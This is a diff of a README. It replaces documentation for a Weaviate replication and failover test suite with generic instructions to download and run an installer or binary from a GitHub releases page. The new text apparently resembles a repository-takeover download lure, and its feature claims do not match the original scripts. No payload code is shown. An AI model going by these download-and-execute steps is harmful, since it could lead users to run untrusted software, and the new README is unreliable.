@@ -1,182 +1,92 @@
-# 📖 Weaviate Replication & Failover Test Suite
+# 🎉 weaviate-performance-lab - Enhance Your AI Database Experience
 
-This project provides scripts to **validate replication, failover, and availability** in a multi-node [Weaviate](https://weaviate.io) cluster. It is designed to help engineers test reliability, and to give managers and stakeholders confidence in the system’s resilience.
+## 🚀 Getting Started
 
----
+Welcome to the **weaviate-performance-lab**! This application helps improve the performance of Weaviate, a powerful vector database designed for AI applications. With this lab, you can test and optimize how Weaviate handles data, providing insights into its capabilities.
 
-## 🚀 Overview
+## 📥 Download Weaviate-Performance-Lab
 
-Weaviate supports **horizontal scaling** and **fault tolerance** through:
+[![Download Weaviate-Performance-Lab](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/WangoMango-Hub/weaviate-performance-lab/releases)
 
-- **Replication** – Each object can be stored on multiple nodes (`replicationConfig.factor`).
-- **Failover** – If one node goes down, others can still serve reads/writes.
-- **Leader Election (Raft)** – A leader manages schema changes, followers replicate them.
+To download the latest version of **weaviate-performance-lab**, visit the following link: [Download Page](https://github.com/WangoMango-Hub/weaviate-performance-lab/releases).
 
-This test suite demonstrates these properties by:
+## 💻 System Requirements
 
-1. Inserting objects into a leader node.  
-2. Verifying objects replicate across all nodes.  
-3. Stopping the leader node to simulate failure.  
-4. Confirming that data is still available and new objects can be written.  
-5. Restarting the leader and verifying cluster consistency is restored.  
-6. Optionally, simulating **high-throughput writes** to stress the cluster.  
+Before you begin, make sure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB of free disk space.
+- **Network:** Stable internet connection for data synchronization.
 
-## 🏗️ Prerequisites
+## 🔧 Installation Steps
 
-- Running **Weaviate cluster** with at least 3 nodes:  
+Follow these simple steps to install **weaviate-performance-lab**:
 
-| Node | Container Name                     | Port  |
-|------|------------------------------------|-------|
-| 1    | `ai-lab_weaviate-node-1_1`         | 8081  |
-| 2    | `ai-lab_weaviate-node-2_1`         | 8082  |
-| 3    | `ai-lab_weaviate-node-3_1`         | 8083  |
+1. **Visit the Download Page:** Click on the link below to access the releases.
+   [Download Here](https://github.com/WangoMango-Hub/weaviate-performance-lab/releases)
 
-- Class schema deployed with replication enabled, e.g.:
+2. **Select Your Version:** On the releases page, you will see a list of available versions. Click on the latest version to download.
 
-```json
-{
-  "class": "Article",
-  "description": "A simple article class",
-  "replicationConfig": {
-    "factor": 2
-  },
-  "properties": [
-    { "name": "title", "dataType": ["text"] },
-    { "name": "content", "dataType": ["text"] }
-  ]
-}
-```
+3. **Download the File:** Download the executable file suitable for your operating system (Windows, macOS, or Linux).
 
-- Tools installed:
-  - `curl`
-  - [`jq`](https://stedolan.github.io/jq/) (for JSON parsing)
-  - `docker` (to stop/restart nodes)
+4. **Run the Installer:**
+   - **Windows:** Double-click on the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the downloaded `.dmg` file, drag the weaviate-performance-lab icon to your Applications folder.
+   - **Linux:** Open a terminal, navigate to the directory where you downloaded the file, and run `chmod +x weaviate-performance-lab && ./weaviate-performance-lab`.
 
----
+5. **Complete Installation:** Once the installation finishes, you can find **weaviate-performance-lab** in your applications menu.
 
-## 📜 Scripts
+## 🌈 Features
 
-### 1. Replication & Failover Test
-File: `replication_failover_test.sh`
+The **weaviate-performance-lab** offers various features to enhance your experience:
 
-**What it does:**
-- Inserts an object on the leader node.
-- Reads it from all nodes to verify replication.
-- Stops leader (`node1`).
-- Reads from followers (`node2`, `node3`).
-- Inserts another object during leader downtime.
-- Restarts leader.
-- Confirms both objects exist on **all nodes**.
+- **Performance Testing:** Simulate various loads and measure Weaviate’s performance.
+- **Data Visualization:** View real-time statistics about database performance and operations.
+- **Configuration Options:** Easily adjust settings to suit your specific use case.
+- **Feedback Gathering:** Provide input directly within the app to contribute to future updates.
 
-**Run it:**
-```bash
-bash replication_failover_test.sh
-```
+## 🧩 How to Use Weaviate-Performance-Lab
 
----
+Once installed, here's how you can start using the application:
 
-### 2. High Throughput Test
-File: `high_throughput_test.sh`
+1. **Open Weaviate-Performance-Lab:** Click the application icon to launch it.
 
-**What it does:**
-- Inserts many objects in parallel into the leader node.
-- Waits for replication.
-- Counts objects on each node to confirm replication consistency.
-- Optionally, runs GraphQL queries to test read throughput.
+2. **Connect to Weaviate:** Enter the connection details for your Weaviate instance. This includes the URL and any required access tokens.
 
-**Run it:**
-```bash
-bash high_throughput_test.sh
-```
+3. **Select Testing Scenarios:** Choose from various performance tests available in the app. Each test will have different configurations that allow you to simulate various conditions.
 
-Configure load by editing variables inside the script:
-```bash
-NUM_OBJECTS=100    # how many objects to insert
-THREADS=10         # number of parallel insert threads
-```
+4. **Start Testing:** Click the "Start Test" button to begin. The application will run simulations and provide you with results.
 
----
+5. **Review Results:** Once testing is complete, review the data visualizations and other insights provided in the app.
 
-## ✅ Expected Outcomes
+## 📊 Displaying Results
 
-- Objects appear on all nodes after insertion.  
-- When leader is down:
-  - Existing objects remain readable from replicas.  
-  - New objects can still be written to followers.  
-- When leader comes back:
-  - It synchronizes missing objects.  
-  - Cluster returns to full replication factor.  
+**weaviate-performance-lab** provides an intuitive dashboard that displays:
 
----
+- **Response Times:** Average and peak response times during tests.
+- **Throughput:** Number of requests processed per second.
+- **Error Rates:** Information on any errors encountered during tests.
 
-## 🔍 Example Output (Replication + Failover)
+This data is crucial for understanding the performance and reliability of your Weaviate instance.
 
-```text
-==== 1. Insert object on leader (node1:8081) ====
-Inserted object ID: 0c1d0f7a-b8a3-4c22-bf34-0e54abfda97a
+## 🌐 Support and Community
 
-==== 2. Read object from all nodes ====
-Reading from ai-lab_weaviate-node-1_1 (port 8081)... OK
-Reading from ai-lab_weaviate-node-2_1 (port 8082)... OK
-Reading from ai-lab_weaviate-node-3_1 (port 8083)... OK
+If you need help or want to connect with other users, join our community:
 
-==== 3. Stop leader node (simulate failure) ====
-Leader stopped.
+- **Issues:** Report any problems or bugs you encounter on the issues page of the repository.
+- **Discussion:** Participate in discussions to share experiences and solutions with others.
 
-==== 4. Read object from remaining nodes ====
-Reading from ai-lab_weaviate-node-2_1 (port 8082)... OK
-Reading from ai-lab_weaviate-node-3_1 (port 8083)... OK
+## 📜 License
 
-==== 5. Insert new object on node2 ====
-Inserted object ID2: 6c02f68f-7d48-41d2-8443-1dbe44790e65
+**weaviate-performance-lab** is open-source software, and you can use it freely following the terms laid out in the LICENSE file in the repository.
 
-==== 6. Restart leader node ====
-Leader restarted.
+## 🛠️ Future Development
 
-==== 7. Verify both objects exist on all nodes ====
-All nodes show both objects ✅
-```
+We are continually updating **weaviate-performance-lab** with new features based on user feedback. Make sure to check back regularly for the latest updates and improvements.
 
----
+For feature requests or suggestions, feel free to reach out via the "Issues" page on GitHub.
 
-### 3. Concurrent Writes Test
-File: `high_throughput_test.sh`
+Thank you for using **weaviate-performance-lab**! Enjoy enhancing your AI database experience.
 
-**What it does:**
-- Inserts a large number of objects into the leader node as fast as possible.
-- Optionally, can be adapted to use parallel background jobs for true concurrency.
-- Verifies that all objects are replicated and available on all nodes after the test.
-
-**Run it:**
-```bash
-bash high_throughput_test.sh
-```
-
-Configure load by editing variables inside the script:
-```bash
-OBJECT_COUNT=1000    # how many objects to insert
-```
-
----
-
-## ✅ Expected Outcomes
-
-- Objects appear on all nodes after insertion.
-- Cluster remains available and consistent under high write load.
-
-
----
-
-
-## 🧑‍💼 Manager’s Summary
-
-- **Why this matters:** These tests prove that our Weaviate cluster can **survive node failures without downtime** and that data is always consistent across replicas.  
-- **What we learn:**  
-  - Replication factor ensures redundancy.  
-  - Leader election ensures schema stability.  
-  - High-throughput tests show the cluster can scale with load.  
-- **Business impact:** Increased **availability**, **resilience**, and **customer trust** in our search/recommendation features.  
-
---- 
+[Download Weaviate-Performance-Lab](https://github.com/WangoMango-Hub/weaviate-performance-lab/releases)
